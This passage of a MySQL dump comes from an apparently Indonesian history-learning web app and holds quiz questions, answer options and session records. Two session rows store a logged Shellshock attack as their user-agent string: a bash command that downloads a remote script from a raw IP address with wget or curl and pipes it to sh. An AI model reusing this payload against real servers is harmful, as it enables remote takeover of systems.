Cokroaminoto','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(42,11,'Soekarno','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(43,11,'Cipto Mangunkusumo','1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(44,11,'Mohammad Hatta','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(45,12,'Merdeka atau Mati','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(46,12,'Bhinneka Tunggal Ika','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(47,12,'Sekali Merdeka Tetap Merdeka','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(48,12,'Tut Wuri Handayani','1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(49,13,'Pendidikan dan Kebudayaan Jawa','1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(50,13,'Perang Bersenjata Melawan Belanda','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(51,13,'Reformasi Agraria','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(52,13,'Persatuan Pedagang Islam','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(53,14,'Kongres Pemuda I','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(54,14,'Kongres Pemuda II','1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(55,14,'Kongres Nasional','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(56,14,'Sidang BPUPKI','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(57,15,'H.O.S. Cokroaminoto','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(58,15,'Soekarno','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(59,15,'Cipto Mangunkusumo','1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(60,15,'Mohammad Hatta','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(61,16,'Merdeka atau Mati','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(62,16,'Bhinneka Tunggal Ika','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(63,16,'Sekali Merdeka Tetap Merdeka','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(64,16,'Tut Wuri Handayani','1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(65,17,'Pendidikan dan Kebudayaan Jawa','1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(66,17,'Perang Bersenjata Melawan Belanda','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(67,17,'Reformasi Agraria','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(68,17,'Persatuan Pedagang Islam','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(69,18,'Kongres Pemuda I','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(70,18,'Kongres Pemuda II','1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(71,18,'Kongres Nasional','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(72,18,'Sidang BPUPKI','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(73,19,'H.O.S. Cokroaminoto','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(74,19,'Soekarno','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(75,19,'Cipto Mangunkusumo','1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(76,19,'Mohammad Hatta','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(77,20,'Merdeka atau Mati','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(78,20,'Bhinneka Tunggal Ika','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(79,20,'Sekali Merdeka Tetap Merdeka','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(80,20,'Tut Wuri Handayani','1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(81,21,'Pendidikan dan Kebudayaan Jawa','1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(82,21,'Perang Bersenjata Melawan Belanda','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(83,21,'Reformasi Agraria','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(84,21,'Persatuan Pedagang Islam','0','2025-11-17 06:34:22','2025-11-17 06:34:22'),(85,22,'Kongres Pemuda I','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(86,22,'Kongres Pemuda II','1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(87,22,'Kongres Nasional','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(88,22,'Sidang BPUPKI','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(89,23,'H.O.S. Cokroaminoto','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(90,23,'Soekarno','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(91,23,'Cipto Mangunkusumo','1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(92,23,'Mohammad Hatta','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(93,24,'Merdeka atau Mati','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(94,24,'Bhinneka Tunggal Ika','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(95,24,'Sekali Merdeka Tetap Merdeka','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(96,24,'Tut Wuri Handayani','1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(97,25,'Pendidikan dan Kebudayaan Jawa','1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(98,25,'Perang Bersenjata Melawan Belanda','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(99,25,'Reformasi Agraria','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(100,25,'Persatuan Pedagang Islam','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(101,26,'Kongres Pemuda I','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(102,26,'Kongres Pemuda II','1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(103,26,'Kongres Nasional','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(104,26,'Sidang BPUPKI','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(105,27,'H.O.S. Cokroaminoto','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(106,27,'Soekarno','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(107,27,'Cipto Mangunkusumo','1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(108,27,'Mohammad Hatta','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(109,28,'Merdeka atau Mati','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(110,28,'Bhinneka Tunggal Ika','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(111,28,'Sekali Merdeka Tetap Merdeka','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(112,28,'Tut Wuri Handayani','1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(113,29,'Pendidikan dan Kebudayaan Jawa','1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(114,29,'Perang Bersenjata Melawan Belanda','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(115,29,'Reformasi Agraria','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(116,29,'Persatuan Pedagang Islam','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(117,30,'Kongres Pemuda I','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(118,30,'Kongres Pemuda II','1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(119,30,'Kongres Nasional','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(120,30,'Sidang BPUPKI','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(121,31,'H.O.S. Cokroaminoto','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(122,31,'Soekarno','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(123,31,'Cipto Mangunkusumo','1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(124,31,'Mohammad Hatta','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(125,32,'Merdeka atau Mati','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(126,32,'Bhinneka Tunggal Ika','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(127,32,'Sekali Merdeka Tetap Merdeka','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(128,32,'Tut Wuri Handayani','1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(129,33,'Pendidikan dan Kebudayaan Jawa','1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(130,33,'Perang Bersenjata Melawan Belanda','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(131,33,'Reformasi Agraria','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(132,33,'Persatuan Pedagang Islam','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(133,34,'Kongres Pemuda I','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(134,34,'Kongres Pemuda II','1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(135,34,'Kongres Nasional','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(136,34,'Sidang BPUPKI','0','2025-11-17 06:34:23','2025-11-17 06:34:23'),(137,35,'H.O.S. Cokroaminoto','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(138,35,'Soekarno','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(139,35,'Cipto Mangunkusumo','1','2025-11-17 06:34:24','2025-11-17 06:34:24'),(140,35,'Mohammad Hatta','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(141,36,'Merdeka atau Mati','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(142,36,'Bhinneka Tunggal Ika','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(143,36,'Sekali Merdeka Tetap Merdeka','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(144,36,'Tut Wuri Handayani','1','2025-11-17 06:34:24','2025-11-17 06:34:24'),(145,37,'Pendidikan dan Kebudayaan Jawa','1','2025-11-17 06:34:24','2025-11-17 06:34:24'),(146,37,'Perang Bersenjata Melawan Belanda','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(147,37,'Reformasi Agraria','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(148,37,'Persatuan Pedagang Islam','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(149,38,'Kongres Pemuda I','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(150,38,'Kongres Pemuda II','1','2025-11-17 06:34:24','2025-11-17 06:34:24'),(151,38,'Kongres Nasional','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(152,38,'Sidang BPUPKI','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(153,39,'H.O.S. Cokroaminoto','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(154,39,'Soekarno','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(155,39,'Cipto Mangunkusumo','1','2025-11-17 06:34:24','2025-11-17 06:34:24'),(156,39,'Mohammad Hatta','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(157,40,'Merdeka atau Mati','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(158,40,'Bhinneka Tunggal Ika','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(159,40,'Sekali Merdeka Tetap Merdeka','0','2025-11-17 06:34:24','2025-11-17 06:34:24'),(160,40,'Tut Wuri Handayani','1','2025-11-17 06:34:24','2025-11-17 06:34:24');
/*!40000 ALTER TABLE `options` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `password_reset_tokens`
--

DROP TABLE IF EXISTS `password_reset_tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `password_reset_tokens` (
  `email` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`email`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `password_reset_tokens`
--

LOCK TABLES `password_reset_tokens` WRITE;
/*!40000 ALTER TABLE `password_reset_tokens` DISABLE KEYS */;
/*!40000 ALTER TABLE `password_reset_tokens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `personal_access_tokens`
--

DROP TABLE IF EXISTS `personal_access_tokens`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `personal_access_tokens` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `tokenable_type` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `tokenable_id` bigint unsigned NOT NULL,
  `name` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `token` varchar(64) COLLATE utf8mb4_unicode_ci NOT NULL,
  `abilities` text COLLATE utf8mb4_unicode_ci,
  `last_used_at` timestamp NULL DEFAULT NULL,
  `expires_at` timestamp NULL DEFAULT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `personal_access_tokens_token_unique` (`token`),
  KEY `personal_access_tokens_tokenable_type_tokenable_id_index` (`tokenable_type`,`tokenable_id`),
  KEY `personal_access_tokens_expires_at_index` (`expires_at`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `personal_access_tokens`
--

LOCK TABLES `personal_access_tokens` WRITE;
/*!40000 ALTER TABLE `personal_access_tokens` DISABLE KEYS */;
/*!40000 ALTER TABLE `personal_access_tokens` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `prompt_cache`
--

DROP TABLE IF EXISTS `prompt_cache`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `prompt_cache` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `prompt_hash` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `response_content` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `prompt_cache`
--

LOCK TABLES `prompt_cache` WRITE;
/*!40000 ALTER TABLE `prompt_cache` DISABLE KEYS */;
/*!40000 ALTER TABLE `prompt_cache` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `questions`
--

DROP TABLE IF EXISTS `questions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `questions` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `quiz_id` bigint unsigned NOT NULL,
  `question_text` text COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `questions_quiz_id_foreign` (`quiz_id`),
  CONSTRAINT `questions_quiz_id_foreign` FOREIGN KEY (`quiz_id`) REFERENCES `quizzes` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=41 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `questions`
--

LOCK TABLES `questions` WRITE;
/*!40000 ALTER TABLE `questions` DISABLE KEYS */;
INSERT INTO `questions` VALUES (1,1,'Manakah yang merupakan fokus utama dari Budi Utomo pada awal berdirinya?','2025-11-17 06:34:21','2025-11-17 06:34:21'),(2,1,'Sumpah Pemuda dicetuskan pada Kongres Pemuda ke berapa?','2025-11-17 06:34:21','2025-11-17 06:34:21'),(3,1,'Siapa salah satu dari \"Tiga Serangkai\" pendiri Indische Partij?','2025-11-17 06:34:21','2025-11-17 06:34:21'),(4,1,'Apa semboyan terkenal dari Taman Siswa?','2025-11-17 06:34:21','2025-11-17 06:34:21'),(5,2,'Manakah yang merupakan fokus utama dari Budi Utomo pada awal berdirinya?','2025-11-17 06:34:21','2025-11-17 06:34:21'),(6,2,'Sumpah Pemuda dicetuskan pada Kongres Pemuda ke berapa?','2025-11-17 06:34:21','2025-11-17 06:34:21'),(7,2,'Siapa salah satu dari \"Tiga Serangkai\" pendiri Indische Partij?','2025-11-17 06:34:21','2025-11-17 06:34:21'),(8,2,'Apa semboyan terkenal dari Taman Siswa?','2025-11-17 06:34:21','2025-11-17 06:34:21'),(9,3,'Manakah yang merupakan fokus utama dari Budi Utomo pada awal berdirinya?','2025-11-17 06:34:21','2025-11-17 06:34:21'),(10,3,'Sumpah Pemuda dicetuskan pada Kongres Pemuda ke berapa?','2025-11-17 06:34:22','2025-11-17 06:34:22'),(11,3,'Siapa salah satu dari \"Tiga Serangkai\" pendiri Indische Partij?','2025-11-17 06:34:22','2025-11-17 06:34:22'),(12,3,'Apa semboyan terkenal dari Taman Siswa?','2025-11-17 06:34:22','2025-11-17 06:34:22'),(13,4,'Manakah yang merupakan fokus utama dari Budi Utomo pada awal berdirinya?','2025-11-17 06:34:22','2025-11-17 06:34:22'),(14,4,'Sumpah Pemuda dicetuskan pada Kongres Pemuda ke berapa?','2025-11-17 06:34:22','2025-11-17 06:34:22'),(15,4,'Siapa salah satu dari \"Tiga Serangkai\" pendiri Indische Partij?','2025-11-17 06:34:22','2025-11-17 06:34:22'),(16,4,'Apa semboyan terkenal dari Taman Siswa?','2025-11-17 06:34:22','2025-11-17 06:34:22'),(17,5,'Manakah yang merupakan fokus utama dari Budi Utomo pada awal berdirinya?','2025-11-17 06:34:22','2025-11-17 06:34:22'),(18,5,'Sumpah Pemuda dicetuskan pada Kongres Pemuda ke berapa?','2025-11-17 06:34:22','2025-11-17 06:34:22'),(19,5,'Siapa salah satu dari \"Tiga Serangkai\" pendiri Indische Partij?','2025-11-17 06:34:22','2025-11-17 06:34:22'),(20,5,'Apa semboyan terkenal dari Taman Siswa?','2025-11-17 06:34:22','2025-11-17 06:34:22'),(21,6,'Manakah yang merupakan fokus utama dari Budi Utomo pada awal berdirinya?','2025-11-17 06:34:22','2025-11-17 06:34:22'),(22,6,'Sumpah Pemuda dicetuskan pada Kongres Pemuda ke berapa?','2025-11-17 06:34:22','2025-11-17 06:34:22'),(23,6,'Siapa salah satu dari \"Tiga Serangkai\" pendiri Indische Partij?','2025-11-17 06:34:23','2025-11-17 06:34:23'),(24,6,'Apa semboyan terkenal dari Taman Siswa?','2025-11-17 06:34:23','2025-11-17 06:34:23'),(25,7,'Manakah yang merupakan fokus utama dari Budi Utomo pada awal berdirinya?','2025-11-17 06:34:23','2025-11-17 06:34:23'),(26,7,'Sumpah Pemuda dicetuskan pada Kongres Pemuda ke berapa?','2025-11-17 06:34:23','2025-11-17 06:34:23'),(27,7,'Siapa salah satu dari \"Tiga Serangkai\" pendiri Indische Partij?','2025-11-17 06:34:23','2025-11-17 06:34:23'),(28,7,'Apa semboyan terkenal dari Taman Siswa?','2025-11-17 06:34:23','2025-11-17 06:34:23'),(29,8,'Manakah yang merupakan fokus utama dari Budi Utomo pada awal berdirinya?','2025-11-17 06:34:23','2025-11-17 06:34:23'),(30,8,'Sumpah Pemuda dicetuskan pada Kongres Pemuda ke berapa?','2025-11-17 06:34:23','2025-11-17 06:34:23'),(31,8,'Siapa salah satu dari \"Tiga Serangkai\" pendiri Indische Partij?','2025-11-17 06:34:23','2025-11-17 06:34:23'),(32,8,'Apa semboyan terkenal dari Taman Siswa?','2025-11-17 06:34:23','2025-11-17 06:34:23'),(33,9,'Manakah yang merupakan fokus utama dari Budi Utomo pada awal berdirinya?','2025-11-17 06:34:23','2025-11-17 06:34:23'),(34,9,'Sumpah Pemuda dicetuskan pada Kongres Pemuda ke berapa?','2025-11-17 06:34:23','2025-11-17 06:34:23'),(35,9,'Siapa salah satu dari \"Tiga Serangkai\" pendiri Indische Partij?','2025-11-17 06:34:23','2025-11-17 06:34:23'),(36,9,'Apa semboyan terkenal dari Taman Siswa?','2025-11-17 06:34:24','2025-11-17 06:34:24'),(37,10,'Manakah yang merupakan fokus utama dari Budi Utomo pada awal berdirinya?','2025-11-17 06:34:24','2025-11-17 06:34:24'),(38,10,'Sumpah Pemuda dicetuskan pada Kongres Pemuda ke berapa?','2025-11-17 06:34:24','2025-11-17 06:34:24'),(39,10,'Siapa salah satu dari \"Tiga Serangkai\" pendiri Indische Partij?','2025-11-17 06:34:24','2025-11-17 06:34:24'),(40,10,'Apa semboyan terkenal dari Taman Siswa?','2025-11-17 06:34:24','2025-11-17 06:34:24');
/*!40000 ALTER TABLE `questions` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `quizzes`
--

DROP TABLE IF EXISTS `quizzes`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `quizzes` (
  `id` bigint unsigned NOT NULL AUTO_INCREMENT,
  `course_id` bigint unsigned NOT NULL,
  `title` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `content` text COLLATE utf8mb4_unicode_ci,
  `order` int NOT NULL,
  `is_published` char(1) COLLATE utf8mb4_unicode_ci NOT NULL DEFAULT '0',
  `created_at` timestamp NULL DEFAULT NULL,
  `updated_at` timestamp NULL DEFAULT NULL,
  PRIMARY KEY (`id`),
  KEY `quizzes_course_id_foreign` (`course_id`),
  CONSTRAINT `quizzes_course_id_foreign` FOREIGN KEY (`course_id`) REFERENCES `courses` (`id`) ON DELETE CASCADE
) ENGINE=InnoDB AUTO_INCREMENT=11 DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `quizzes`
--

LOCK TABLES `quizzes` WRITE;
/*!40000 ALTER TABLE `quizzes` DISABLE KEYS */;
INSERT INTO `quizzes` VALUES (1,1,'Kuis - Orientasi Jurnalis Muda - Memahami Lanskap Pergerakan','Uji pemahamanmu tentang materi Orientasi Jurnalis Muda - Memahami Lanskap Pergerakan',99,'1','2025-11-17 06:34:21','2025-11-17 06:34:21'),(2,2,'Kuis - Misi Investigasi - Menggali Perspektif Para Delegasi','Uji pemahamanmu tentang materi Misi Investigasi - Menggali Perspektif Para Delegasi',99,'1','2025-11-17 06:34:21','2025-11-17 06:34:21'),(3,3,'Kuis - Sarekat Islam dan Pergerakan Massa','Uji pemahamanmu tentang materi Sarekat Islam dan Pergerakan Massa',99,'1','2025-11-17 06:34:21','2025-11-17 06:34:21'),(4,4,'Kuis - Taman Siswa: Pendidikan sebagai Perlawanan','Uji pemahamanmu tentang materi Taman Siswa: Pendidikan sebagai Perlawanan',99,'1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(5,5,'Kuis - Indische Partij: Tiga Serangkai','Uji pemahamanmu tentang materi Indische Partij: Tiga Serangkai',99,'1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(6,6,'Kuis - Era VOC: Awal Kolonialisme','Uji pemahamanmu tentang materi Era VOC: Awal Kolonialisme',99,'1','2025-11-17 06:34:22','2025-11-17 06:34:22'),(7,7,'Kuis - Kursus Tambahan 7: Politik Etis','Uji pemahamanmu tentang materi Kursus Tambahan 7: Politik Etis',99,'1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(8,8,'Kuis - Kursus Tambahan 8: Perang Diponegoro','Uji pemahamanmu tentang materi Kursus Tambahan 8: Perang Diponegoro',99,'1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(9,9,'Kuis - Kursus Tambahan 9: Volksraad','Uji pemahamanmu tentang materi Kursus Tambahan 9: Volksraad',99,'1','2025-11-17 06:34:23','2025-11-17 06:34:23'),(10,10,'Kuis - Kursus Tambahan 10: Romusha','Uji pemahamanmu tentang materi Kursus Tambahan 10: Romusha',99,'1','2025-11-17 06:34:24','2025-11-17 06:34:24');
/*!40000 ALTER TABLE `quizzes` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `sessions`
--

DROP TABLE IF EXISTS `sessions`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!50503 SET character_set_client = utf8mb4 */;
CREATE TABLE `sessions` (
  `id` varchar(255) COLLATE utf8mb4_unicode_ci NOT NULL,
  `user_id` bigint unsigned DEFAULT NULL,
  `ip_address` varchar(45) COLLATE utf8mb4_unicode_ci DEFAULT NULL,
  `user_agent` text COLLATE utf8mb4_unicode_ci,
  `payload` longtext COLLATE utf8mb4_unicode_ci NOT NULL,
  `last_activity` int NOT NULL,
  PRIMARY KEY (`id`),
  KEY `sessions_user_id_index` (`user_id`),
  KEY `sessions_last_activity_index` (`last_activity`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `sessions`
--

LOCK TABLES `sessions` WRITE;
/*!40000 ALTER TABLE `sessions` DISABLE KEYS */;
INSERT INTO `sessions` VALUES ('1qM9wemndJ35Kt1vW5ownJEnSzXvcox1v8UUFSuy',NULL,'204.76.203.219','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiY3RqWjV6UnRCQ3U1NldEUng3YU1MRWo3N0w4SVlvVjRNRjlOMEdmUCI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763430450),('3e8eQVlFzCiQOLvGPYI33TTrYtH0k5WSjSYbxAto',NULL,'204.76.203.219','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiYlJGZGJVTG9EUzltZGxONUMySHRUWVVNRFZJUEE0SnVtMWVJYWtDRyI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763428223),('B0WyitfrdKZABGo9zVhq5m2AaoyLDE05Xe6cGhgD',NULL,'192.159.99.95','() { :; }; /bin/bash -c \"(wget -qO- http://74.194.191.52/rondo.qre.sh||busybox wget -qO- http://74.194.191.52/rondo.qre.sh||curl -s http://74.194.191.52/rondo.qre.sh)|sh\"& # bang2013@atomicmail.io','YTozOntzOjY6Il90b2tlbiI7czo0MDoiZmczWlg5alpWbTdpckFhcW9MRkdjdzBGS1ZUMzR6Z1FtV1hTM3V4dyI7czo5OiJfcHJldmlvdXMiO2E6Mjp7czozOiJ1cmwiO3M6MjU6Imh0dHA6Ly8xMDMuMTAzLjIwLjM1OjgwODAiO3M6NToicm91dGUiO047fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763422445),('bOTtWzh6bv0TJCG8WEphlrX1nP487eofeERDQAS4',NULL,'192.159.99.95','() { :; }; /bin/bash -c \"(wget -qO- http://74.194.191.52/rondo.qre.sh||busybox wget -qO- http://74.194.191.52/rondo.qre.sh||curl -s http://74.194.191.52/rondo.qre.sh)|sh\"& # bang2013@atomicmail.io','YTozOntzOjY6Il90b2tlbiI7czo0MDoiOEk3ZHphS0xBbFJWaWNWRzB1OHltM2RpVWxaYTdGZUwycGEwUHI0biI7czo5OiJfcHJldmlvdXMiO2E6Mjp7czozOiJ1cmwiO3M6MjU6Imh0dHA6Ly8xMDMuMTAzLjIwLjM1OjgwODAiO3M6NToicm91dGUiO047fXM6NjoiX2ZsYXNoIjthOjI6e3M6Mzoib2xkIjthOjA6e31zOjM6Im5ldyI7YTowOnt9fX0=',1763426652),('cqD6BJvnUSTabU53hmaA1gLt0DCVBcpkShEpiRbl',NULL,'204.76.203.219','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46','YToyOntzOjY6Il90b2tlbiI7czo0MDoiclpScGh3YnI1N1V1enIyV0J3ejExNk9jcndUbU9OQzBPZEk5cWRCQiI7czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763429707),('cVHocuRZG4GEFI40iAYDnYQBv9fFNZctRZOWHdYg',NULL,'161.129.164.255','Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:144.0) Gecko/20100101 Firefox/144.0','YTozOntzOjY6Il90b2tlbiI7czo0MDoia2ZKcU92cmJucGQzZWRWY3lZdVFPdFVHQ0ljRkQ2UzRMWWlMd2VFbCI7czo5OiJfcHJldmlvdXMiO2E6Mjp7czozOiJ1cmwiO3M6MjE6Imh0dHBzOi8va2VsYXNzYXJhaC5pZCI7czo1OiJyb3V0ZSI7Tjt9czo2OiJfZmxhc2giO2E6Mjp7czozOiJvbGQiO2E6MDp7fXM6MzoibmV3IjthOjA6e319fQ==',1763429235),('G8FO2EMJZzudEKGICxmvwe4JQPgiiBjY1mXlEFGq',NULL,'204.76.203.219','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 